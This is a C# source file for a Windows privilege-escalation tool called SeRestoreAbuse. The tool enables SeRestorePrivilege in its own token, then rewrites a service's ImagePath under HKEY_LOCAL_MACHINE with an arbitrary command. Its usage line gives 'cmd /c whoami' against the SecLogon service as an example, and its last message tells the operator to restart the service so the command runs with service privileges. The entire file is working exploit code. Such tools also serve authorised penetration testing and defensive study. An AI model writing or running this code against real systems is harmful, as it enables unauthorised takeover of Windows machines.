using System;
using System.Runtime.InteropServices;

namespace SeRestoreAbuse
{
    public class Program
    {
        private const Int32 ANYSIZE_ARRAY = 1;
        private const string SE_RESTORE_NAME = "SeRestorePrivilege";
        private const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
        private const int REG_OPTION_BACKUP_RESTORE = 0x00000004;
        private const int KEY_SET_VALUE = 0x00000002;

        [Flags()]
        enum TokenAccessFlags : int
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID)
        }

        public enum ROOT_KEY : uint
        {
            HKEY_CLASSES_ROOT = 0x80000000,
            HKEY_CURRENT_USER = 0x80000001,
            HKEY_LOCAL_MACHINE = 0x80000002,
            HKEY_USERS = 0x80000003,
            HKEY_PERFORMANCE_DATA = 0x80000004,
            HKEY_CURRENT_CONFIG = 0x80000005,
            HKEY_DYN_DATA = 0x80000006
        }


        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public int lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public uint HighPart;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }

        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            TokenAccessFlags DesiredAccess,
            out IntPtr TokenHandle
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            UInt32 Zero,
            IntPtr Null1,
            IntPtr Null2
        );



        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegCreateKeyExA", SetLastError = true)]
        static extern int RegCreateKeyExA(
            ROOT_KEY hKey,
            [MarshalAs(UnmanagedType.LPStr)] string subKey,
            int Reserved,
            [MarshalAs(UnmanagedType.LPStr)] string lpClass,
            int dwOptions,
            int samDesired,
            IntPtr lpSecurityAttributes,
            out UIntPtr phkResult,
            IntPtr lpdwDisposition
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int RegSetValueEx(
            UIntPtr hKey,
            [MarshalAs(UnmanagedType.LPStr)] string lpValueName,
            int Reserved,
            Microsoft.Win32.RegistryValueKind dwType,
            [MarshalAs(UnmanagedType.LPStr)] string lpData,
            int cbData);


        public static void Main(string[] args)
        {
            string command = default;
            string registry_key = default;
            int last_error, result;
            UIntPtr handle_key;
            IntPtr token_handle;
            LUID myLUID;
            TOKEN_PRIVILEGES myTokenPrivileges;

            // check if the number of arguments is at least 2 (program name not included in args)
            if (args.Length >= 2)
            {
                command = args[0];
                registry_key = args[1];
            }
            else
            {
                string program_name = System.AppDomain.CurrentDomain.FriendlyName;
                Console.WriteLine(String.Format("Usage: {0} {{cmd}} [registry_path]", program_name));
                Console.WriteLine("\nExamples:");
                Console.WriteLine(String.Format("\t{0} \"cmd /c whoami\" \"SYSTEM\\CurrentControlSet\\Services\\SecLogon\"", program_name));

                Environment.Exit(1);
            }

            Console.WriteLine("[+] Setting the ImagePath of the service you specified...");
            Console.WriteLine("[+] Opening curent process in order to enable SeRestorePrivilege...");

            if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle,
                TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES | TokenAccessFlags.TOKEN_QUERY, out token_handle))
            {
                last_error = Marshal.GetLastWin32Error();
                Console.WriteLine("[!] Function OpenProcessToken failed. Win32 Error code: ", last_error);
                Environment.Exit(last_error);
            } else
            {
                Console.WriteLine("[+] Function OpenProcessToken executed successfully.");
            }

            if (!LookupPrivilegeValue(null, SE_RESTORE_NAME, out myLUID))
            {
                last_error = Marshal.GetLastWin32Error();
                Console.WriteLine("[!] Function LookupPrivilegeValue failed. Win32 Error code: ", last_error);
                Environment.Exit(last_error);
            } else
            {
                Console.WriteLine("[+] Function LookupPrivilegeValue executed successfully.");
            }

            myTokenPrivileges.PrivilegeCount = 1;
            myTokenPrivileges.Privileges = new LUID_AND_ATTRIBUTES[1];
            myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            myTokenPrivileges.Privileges[0].Luid = myLUID;

            if (!AdjustTokenPrivileges(token_handle, false, ref myTokenPrivileges, 0,
                IntPtr.Zero, IntPtr.Zero))
            {
                last_error = Marshal.GetLastWin32Error();
                Console.WriteLine("[!] Function AdjustTokenPrivileges failed. Win32 Error code: ", last_error);
                Environment.Exit(last_error);
            } else
            {
                Console.WriteLine("[+] Function AdjustTokenPrivileges executed successfully.");
            }

            Console.WriteLine("[+] Privilege \"SeRestorePrivilege\" enabled.");


            result = RegCreateKeyExA(
                ROOT_KEY.HKEY_LOCAL_MACHINE,
                registry_key,
                0,
                null,
                REG_OPTION_BACKUP_RESTORE,
                KEY_SET_VALUE,
                IntPtr.Zero,
                out handle_key,
                IntPtr.Zero
            );
            
            if (result != 0)
            {
                last_error = Marshal.GetLastWin32Error();
                
                Console.WriteLine(String.Format("[!] Function RegCreateKeyExA failed. Error code: {0}", last_error));
                Environment.Exit(last_error);
            } else
            {
                Console.WriteLine("[+] Successfully created/opened the registry key.");
            }

            result = RegSetValueEx(handle_key, "ImagePath", 0, Microsoft.Win32.RegistryValueKind.String, command, command.Length);

            if (result != 0)
            {
                last_error = Marshal.GetLastWin32Error();
                Console.WriteLine(String.Format("Function RegSetValueEx failed. Error code: {0}", last_error));
                Environment.Exit(last_error);
            }
            else
            {
                Console.WriteLine("[+] Successfully changed the ImagePath value of specified registry key.");
                Console.WriteLine("[+] Now all you have to do is restart the service.");
            }
        }
    }
}
